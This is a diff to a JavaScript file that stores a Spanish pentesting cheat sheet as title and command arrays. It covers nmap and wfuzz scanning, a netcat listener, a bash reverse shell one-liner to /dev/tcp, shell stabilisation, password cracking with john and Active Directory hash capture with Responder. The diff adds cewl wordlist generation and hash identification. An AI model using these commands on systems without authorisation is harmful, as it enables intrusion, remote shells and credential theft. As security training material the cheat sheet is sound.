@@ -23,7 +23,9 @@ const titulos = ["Ver tarjeta wifi:",
     "Conectarse a Reverse shell desde PHP:",
     "Reverse shell cómoda:",
     "Crackear hashes:",
-    "Capturar hashes Active Directory"
+    "Capturar hashes Active Directory:",
+    "Crear diccionario scrapeando una web:",
+    "Identificar tipo de HASH:"
 ];
 const codigos = ["sudo ifconfig",
     "sudo airmon-ng start “nombreinterfaz”",
@@ -43,13 +45,15 @@ const codigos = ["sudo ifconfig",
     '1. cd /opt/xerosploit <br> 2. ./xerosploit.py',
     "cd /opt/eviltrust",
     '1. airdecap-ng -e “ssid” -p “password” “captura”<br>2. Guarda una captura para abrir en wireshark',
-    "nmap -v ipmaquina",
+    "nmap -p- --open -v -n ipmaquina",
     "wfuzz -c --hc=404 -w rutadiccionario(/usr/share/wordlist/dirbuster/) http://urlweb/FUZZ",
-    "nc -nlvp 433",
+    "1. bash 2. nc -nlvp 433",
     'En urlencoder.org: bash -c "bash -i >& /dev/tcp/miip/443 0>&1"',
     '1. script /dev/null -c bash<br>2. Control Z<br>3. stty raw -echo<br>4. fg<br>5. reset<br>6. xterm<br>7.export TERM=xterm<br>8. export SHELL=bash',
     "john --wordlist=rockyou.txt hash.txt",
-    "python Responder.py -i wlan0 -rdw"
+    "python Responder.py -i wlan0 -rdw",
+    "cewl -dictionary.txt urlweb",
+    "hash-identifier hash"
 ];
 
 
